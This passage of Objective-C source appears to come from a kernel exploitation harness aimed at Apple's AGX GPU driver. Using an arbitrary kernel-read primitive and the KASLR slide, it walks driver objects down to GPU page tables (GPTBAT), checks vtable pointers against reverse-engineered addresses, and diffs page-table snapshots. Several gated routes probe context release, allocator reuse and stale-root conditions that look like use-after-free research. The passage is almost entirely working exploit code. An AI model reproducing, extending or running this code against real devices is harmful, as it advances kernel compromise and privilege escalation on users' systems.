                mainReason = @"hop2-too-many-live-garts";
                goto main_done;
            }
            route1Garts[validatedRoute1GartCount].address = domainGart;
            route1Garts[validatedRoute1GartCount].anchorIndex = selector;
            route1Garts[validatedRoute1GartCount].resolverSelector = selector;
            route1Garts[validatedRoute1GartCount].perTask = true;
            route1Garts[validatedRoute1GartCount].derivedDomain = true;
            validatedRoute1GartCount++;
            domainReport[@"result"] = @"validated-route1-anchor";
            CNDUatE1Persist(report);
            log_user("[UAT_E1] per-task resolver selector=%lu "
                     "field=0x%llx gart=0x%016llx validated=yes\n",
                     (unsigned long)selector,
                     (unsigned long long)fieldOffset,
                     (unsigned long long)domainGart);
        }
    }

    CNDUatE1Progress(report, @"hop1", @"read-client-provider",
                     client + CNDUatE1ClientProvider);
    uint64_t acceleratorRaw = 0;
    if (!CNDUatE1Read64(&api, client + CNDUatE1ClientProvider,
                        &acceleratorRaw)) {
        mainReason = @"hop1-provider-read-failed";
        goto main_done;
    }
    uint64_t accelerator = CNDUatE1CanonicalPointer(&api, acceleratorRaw);
    report[@"hop1"] = @{
        @"client": CNDUatE1Hex(client),
        @"offset": @"0xf8",
        @"provider": CNDUatE1PointerReport(&api, acceleratorRaw),
    };
    if (accelerator == 0 || (accelerator & 0xf) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, &api, @"hop1.accelerator", accelerator,
            CNDUatE1AcceleratorVtable, slide,
            @"successful type-1 IOServiceOpen; IOGPU start OSDynamicCast and "
             "client+0xf8 store 0xa4ff454..0xa4ff46c; G17P final vptr "
             "install 0x8b05d20..0x8b05d38", NULL)) {
        mainReason = @"hop1-accelerator-predicate-failed";
        goto main_done;
    }

    if (agxRTBuddyAliasGate) {
        NSString *aliasReason = nil;
        mainPassed = CNDUatAGXRunRTBuddyAliasRoute(
            report, &api, slide, accelerator, &aliasReason);
        mainTableReached = [report[@"tableReached"] boolValue];
        mainReason = aliasReason ?: @"agx-rtbuddy-alias-unknown";
        bool aliasReached =
            [report[@"agxRTBuddyAliasGateReached"] boolValue];
        report[@"namedActionStatus"] = aliasReached
            ? @"completed-rtbuddy-output-alias-read"
            : @"aborted-before-rtbuddy-output-alias-read";
        goto main_done;
    }

    if (agxBootstrapRootGate) {
        NSString *bootstrapReason = nil;
        mainPassed = CNDUatAGXRunBootstrapRootRoute(
            report, &api, slide, accelerator, &bootstrapReason);
        mainTableReached = [report[@"tableReached"] boolValue];
        mainReason = bootstrapReason ?: @"agx-bootstrap-root-unknown";
        bool associationReached =
            [report[@"agxBootstrapRootAssociationGateReached"] boolValue];
        report[@"namedActionStatus"] = mainPassed
            ? @"completed-bootstrap-root-associated"
            : (associationReached
                ? @"completed-bootstrap-root-associated"
                : @"aborted-before-bootstrap-root-association");
        goto main_done;
    }

    gartReports = [NSMutableArray array];
    for (NSUInteger index = 0; index < 2; index++) {
        uint64_t field = accelerator + gartOffsets[index];
        NSString *hop = [NSString stringWithFormat:@"hop2.gart%lu",
                         (unsigned long)index];
        CNDUatE1Progress(report, hop, @"read-accelerator-field", field);
        uint64_t gartRaw = 0;
        if (!CNDUatE1Read64(&api, field, &gartRaw)) {
            mainReason = [NSString stringWithFormat:
                          @"hop2-gart%lu-read-failed",
                          (unsigned long)index];
            goto main_done;
        }
        uint64_t gart = CNDUatE1CanonicalPointer(&api, gartRaw);
        NSMutableDictionary *gartReport = [@{
            @"index": @(index),
            @"fieldOffset": [NSString stringWithFormat:@"0x%llx",
                              (unsigned long long)gartOffsets[index]],
            @"pointer": CNDUatE1PointerReport(&api, gartRaw),
        } mutableCopy];
        [gartReports addObject:gartReport];
        report[@"hop2"] = gartReports;
        CNDUatE1Persist(report);
        if (gart == 0) {
            gartReport[@"result"] = @"null-skipped";
            continue;
        }
        if ((gart & 0xf) != 0 ||
            !CNDUatE1ValidateLifecycleVptr(
                report, &api, hop, gart, CNDUatE1GartVtable, slide,
                @"GART factory vptr autda 0x8a74408; successful virtual init "
                 "0x8a7442c; publish 0x8a7f47c/0x8a7f4c0", NULL)) {
            gartReport[@"result"] = @"predicate-failed";
            mainReason = [NSString stringWithFormat:
                          @"hop2-gart%lu-predicate-failed",
                          (unsigned long)index];
            goto main_done;
        }
        gartReport[@"result"] = @"validated";

        if (routeFlag == 1) {
            if (validatedRoute1GartCount >= 6) {
                mainReason = @"hop2-too-many-live-garts";
                goto main_done;
            }
            route1Garts[validatedRoute1GartCount].address = gart;
            route1Garts[validatedRoute1GartCount].anchorIndex = index;
            route1Garts[validatedRoute1GartCount].resolverSelector = 0;
            route1Garts[validatedRoute1GartCount].perTask = false;
            route1Garts[validatedRoute1GartCount].derivedDomain = false;
            gartReport[@"result"] = @"validated-route1-anchor";
            validatedRoute1GartCount++;
            continue;
        }

        CNDUatE1Progress(report, @"hop3", @"read-gart-uat-mux",
                         gart + CNDUatE1GartBlock);
        uint64_t blockRaw = 0;
        if (!CNDUatE1Read64(&api, gart + CNDUatE1GartBlock, &blockRaw)) {
            mainReason = @"hop3-block-read-failed";
            goto main_done;
        }
        uint64_t block = CNDUatE1CanonicalPointer(&api, blockRaw);
        if (block == 0 || (block & 0x7) != 0) {
            mainReason = @"hop3-block-shape-failed";
            goto main_done;
        }
        if (!CNDUatE1ValidateLifecycleVptr(
                report, &api, @"hop3.uat-mux", block,
                CNDUatE1UATMuxVtable, slide,
                @"AGXUATMux alloc/instance vptr 0x8b3f168..0x8b3f1a4; "
                 "GART init authenticated virtual calls 0x8b2cfa4..0x8b2cfe0; "
                 "publish to gart+0x328 at 0x8b2cfe4", NULL)) {
            mainReason = @"hop3-uat-mux-vptr-failed";
            goto main_done;
        }

        CNDUatE1Progress(report, @"hop4", @"read-block-agxuat",
                         block + CNDUatE1BlockAGXUAT);
        uint64_t agxuatRaw = 0;
        if (!CNDUatE1Read64(&api, block + CNDUatE1BlockAGXUAT,
                            &agxuatRaw)) {
            mainReason = @"hop4-agxuat-read-failed";
            goto main_done;
        }
        uint64_t agxuat = CNDUatE1CanonicalPointer(&api, agxuatRaw);
        if (agxuat == 0 || (agxuat & 0xf) != 0 ||
            !CNDUatE1ValidateLifecycleVptr(
                report, &api, @"hop4.agxuat", agxuat,
                CNDUatE1AGXUATVtable, slide,
                @"AGXUAT factory vptr autda 0x8b4e9e8/0x8b4eac0; successful "
                 "virtual init 0x8b4ea0c/0x8b4eaf8; block+0x18 publish", NULL)) {
            mainReason = @"hop4-agxuat-predicate-failed";
            goto main_done;
        }

        CNDUatE1Progress(report, @"hop5", @"read-agxuat-gptbat",
                         agxuat + CNDUatE1AGXUATGPTBAT);
        uint64_t gptbatRaw = 0, gptbat = 0;
        if (!CNDUatE1Read64(&api, agxuat + CNDUatE1AGXUATGPTBAT,
                            &gptbatRaw)) {
            mainReason = @"hop5-gptbat-read-failed";
            goto main_done;
        }
        if (!CNDUatE1ValidateGPTBAT(report, &api, gptbatRaw,
                                    gVirtBase, gPhysSize, &gptbat)) {
            mainReason = @"hop5-gptbat-predicate-failed";
            goto main_done;
        }
        bool duplicate = false;
        for (NSUInteger prior = 0; prior < pathCount; prior++) {
            if (paths[prior].gptbat == gptbat) duplicate = true;
        }
        if (!duplicate && pathCount < 2) {
            paths[pathCount].gart = gart;
            paths[pathCount].block = block;
            paths[pathCount].agxuat = agxuat;
            paths[pathCount].gptbat = gptbat;
            paths[pathCount].acceleratorField = gartOffsets[index];
            pathCount++;
        }
    }
    if (routeFlag == 1) {
        report[@"validatedRoute1GartCount"] =
            @(validatedRoute1GartCount);
        if (validatedRoute1GartCount == 0) {
            mainReason = @"hop2-no-live-gart";
            goto main_done;
        }
        NSString *ttbatReason = nil;
        CNDUatE1TTBATRunResult ttbatResult = e5Gate
            ? CNDUatE5RunOwnerReleaseRoute(
                report, &api, slide, e5DeviceReleaseGate,
                e5ConnectionReleaseGate, e5RawQueueReleaseGate,
                e5RawQueueBindReleaseGate,
                &ttbatReason)
            : (e4InflightGate
                ? CNDUatE4RunInflightRoute(
                    report, &api, slide, &ttbatReason)
                : (e2RetirementGate
                ? CNDUatE2RunTTBATRetirementRoute(
                    report, &api, slide, selfTask, &ttbatReason)
                : CNDUatE1RunTTBATRoute(
                    report, &api, slide, selfTask, route1Garts,
                    validatedRoute1GartCount, &ttbatReason)));
        mainTableReached = [report[@"tableReached"] boolValue];
        mainPassed = ttbatResult == CNDUatE1TTBATRunObservedDiff;
        mainReason = ttbatReason ?: @"ttbat-route-unknown";
        goto main_done;
    }
    if (pathCount == 0) {
        mainReason = @"hop2-no-live-gart";
        goto main_done;
    }

    // A physmap range and alignment establish shape, not mappedness.
    // The 4096-byte copyout remains a stop edge on the alternate flag-0
    // route until the table's lifetime and mappedness are independently
    // established from artifacts and a safe runtime predicate.
    report[@"candidateGPTBATCount"] = @(pathCount);
    mainReason = @"snapshot-gptbat-mappedness-unproven";
    goto main_done;

    beforeReports = [NSMutableArray array];
    for (NSUInteger index = 0; index < pathCount; index++) {
        NSDictionary *summary = nil;
        NSString *label = [NSString stringWithFormat:@"before.%lu",
                           (unsigned long)index];
        if (!CNDUatE1SnapshotTable(report, &api, label,
                                    paths[index].gptbat,
                                    &paths[index].before, &summary)) {
            mainReason = @"snapshot-before-shape-failed";
            goto main_done;
        }
        [beforeReports addObject:summary];
    }
    report[@"beforeSnapshots"] = beforeReports;
    CNDUatE1Persist(report);

    CNDUatE1Progress(report, @"action", @"open-type1", 0);
    actionService = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AGXAcceleratorG17P"));
    actionConnection = IO_OBJECT_NULL;
    kern_return_t actionOpen = actionService != IO_OBJECT_NULL
        ? IOServiceOpen(actionService, mach_task_self(), 1, &actionConnection)
        : kIOReturnNotFound;
    if (actionService != IO_OBJECT_NULL) {
        IOObjectRelease(actionService);
        actionService = IO_OBJECT_NULL;
    }
    report[@"actionOpenKR"] = CNDUatE1Hex((uint32_t)actionOpen);
    report[@"actionConnectionCreated"] =
        @(actionOpen == KERN_SUCCESS && actionConnection != IO_OBJECT_NULL);
    CNDUatE1Persist(report);
    if (actionOpen != KERN_SUCCESS || actionConnection == IO_OBJECT_NULL) {
        mainReason = @"named-action-open-failed";
        goto main_done;
    }
    CNDUatE1Progress(report, @"action", @"close-type1", 0);
    kern_return_t actionClose = IOServiceClose(actionConnection);
    actionConnection = IO_OBJECT_NULL;
    report[@"actionCloseKR"] = CNDUatE1Hex((uint32_t)actionClose);
    report[@"actionCompleted"] = @(actionClose == KERN_SUCCESS);
    report[@"namedActionStatus"] = actionClose == KERN_SUCCESS
        ? @"completed" : @"close-failed";
    CNDUatE1Persist(report);
    if (actionClose != KERN_SUCCESS) {
        mainReason = @"named-action-close-failed";
        goto main_done;
    }

    afterReports = [NSMutableArray array];
    allChanges = [NSMutableArray array];
    for (NSUInteger index = 0; index < pathCount; index++) {
        NSDictionary *summary = nil;
        NSString *label = [NSString stringWithFormat:@"after.%lu",
                           (unsigned long)index];
        if (!CNDUatE1SnapshotTable(report, &api, label,
                                    paths[index].gptbat,
                                    &paths[index].after, &summary)) {
            mainReason = @"snapshot-after-shape-failed";
            goto main_done;
        }
        [afterReports addObject:summary];
        [allChanges addObjectsFromArray:CNDUatE1Diff(
            &paths[index].before, &paths[index].after,
            paths[index].gptbat)];
    }
    report[@"afterSnapshots"] = afterReports;
    report[@"changes"] = allChanges;
    report[@"changedEntryCount"] = @(allChanges.count);
    report[@"validatedGPTBATCount"] = @(pathCount);
    mainPassed = allChanges.count > 0;
    mainReason = mainPassed ? @"validated-gptbat-entry-diff" :
        @"validated-gptbat-no-entry-diff";

main_done:
    if (actionConnection != IO_OBJECT_NULL) {
        kern_return_t closeKR = IOServiceClose(actionConnection);
        report[@"actionCleanupCloseKR"] = CNDUatE1Hex((uint32_t)closeKR);
        actionConnection = IO_OBJECT_NULL;
    }
    if (actionService != IO_OBJECT_NULL) {
        IOObjectRelease(actionService);
        actionService = IO_OBJECT_NULL;
    }
    if (observer != IO_OBJECT_NULL) {
        kern_return_t closeKR = IOServiceClose(observer);
        report[@"observerCloseKR"] = CNDUatE1Hex((uint32_t)closeKR);
        observer = IO_OBJECT_NULL;
    }
    report[@"mainChainResult"] = mainReason ?: @"main-chain-unknown";
    CNDUatE1Persist(report);
    if (mainPassed) {
        report[@"evidenceLevel"] = @"physical-observed";
        NSString *resultName = @"pass-full";
        if (agxRTBuddyAliasGate) {
            resultName = @"pass-agx-rtbuddy-output-cpu-alias-read";
        } else if (agxBootstrapRootGate) {
            resultName = @"pass-agx-bootstrap-context0-root-associated";
        } else if (e5Gate) {
            BOOL cleared =
                [report[@"e5ContextClearedWhileHelperAlive"] boolValue];
            resultName = e5RawQueueBindReleaseGate
                ? (cleared
                    ? @"pass-e5-bound-raw-queue-release-context-cleared-with-notification-connection-alive"
                    : @"pass-e5-bound-raw-queue-release-context-retained")
                : (e5RawQueueReleaseGate
                ? (cleared
                    ? @"pass-e5-raw-queue-release-context-cleared-with-connection-alive"
                    : @"pass-e5-raw-queue-release-context-retained")
                : (e5ConnectionReleaseGate
                ? (cleared
                    ? @"pass-e5-connection-release-context-cleared-with-helper-alive"
                    : @"pass-e5-connection-release-context-retained")
                : (e5DeviceReleaseGate
                ? (cleared
                    ? @"pass-e5-device-release-context-cleared-with-helper-alive"
                    : @"pass-e5-device-release-context-retained")
                : (cleared
                    ? @"pass-e5-context-cleared-with-helper-alive"
                    : @"pass-e5-context-retained-after-owner-drain"))));
        } else if (e4InflightGate) {
            resultName = @"pass-e4-observed-chronology";
        } else if (e2RetirementGate) {
            NSUInteger freeMaskSetCount =
                [report[@"rootFreeMaskSetCount"] unsignedIntegerValue];
            if ([report[@"e3LatchPassed"] boolValue]) {
                resultName = [report[@"e3LatchStaleObserved"] boolValue]
                    ? @"pass-e3-stale-root-latch-observed"
                    : @"pass-e3-fresh-root-selected";
            } else if ([report[@"allocatorReuseMatched"] boolValue]) {
                resultName = @"pass-e2-reuse-observed";
            } else if (freeMaskSetCount == 2) {
                resultName = @"pass-e2-root-free-mask-observed";
            } else if (freeMaskSetCount == 1) {
                resultName = @"pass-e2-root-free-mask-partial";
            } else {
                resultName = @"pass-e2-reuse-negative-sample";
            }
        }
        CNDUatE1Finish(report, resultName, completion);
        return;
    }
    if (mainTableReached || pathCount > 0) {
        report[@"fallbackResult"] = @"not-run-gptbat-already-reached";
        report[@"evidenceLevel"] = @"physical-observed";
        CNDUatE1Finish(report, @"fail-clean", completion);
        return;
    }
    if (strictRoute1Gate) {
        report[@"fallbackResult"] = @"not-applicable-to-strict-route1";
        report[@"evidenceLevel"] =
            (agxBootstrapRootGate || agxRTBuddyAliasGate)
            ? @"physical-observed" : @"implemented-not-run";
        CNDUatE1Finish(report, @"fail-clean", completion);
        return;
    }

    NSString *f1Reason = nil;
    bool f1 = CNDUatE1RunFallback(report, &api, slide, &f1Reason);
    report[@"fallbackResult"] = f1 ? @"validated-f1-iouat" :
        (f1Reason ?: @"f1-failed");
    report[@"evidenceLevel"] = @"physical-observed";
    CNDUatE1Finish(report, f1 ? @"pass-partial-f1" : @"fail-clean",
                   completion);
}

static void CNDUatEObserveRunInternal(
    BOOL e2RetirementGate,
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        e2RetirementGate, NO, NO, NO, NO, NO, NO, NO, NO, completion);
}

void CNDUatE1ObserveRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternal(NO, completion);
}

void CNDUatE2RetireRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternal(YES, completion);
}

void CNDUatE4InflightRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, YES, NO, NO, NO, NO, NO, NO, NO, completion);
}

void CNDUatE5OwnerReleaseRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, YES, NO, NO, NO, NO, NO, NO, completion);
}

void CNDUatE5DeviceReleaseRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, NO, YES, NO, NO, NO, NO, NO, completion);
}

void CNDUatE5ConnectionReleaseRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, NO, NO, YES, NO, NO, NO, NO, completion);
}

void CNDUatE5RawQueueReleaseRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, NO, NO, NO, YES, NO, NO, NO, completion);
}

void CNDUatE5RawQueueBindReleaseRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, NO, NO, NO, NO, YES, NO, NO, completion);
}

void CNDUatAGXBootstrapRootRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, NO, NO, NO, NO, NO, YES, NO, completion);
}

void CNDUatAGXRTBuddyAliasRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    CNDUatEObserveRunInternalMode(
        NO, NO, NO, NO, NO, NO, NO, NO, YES, completion);
}
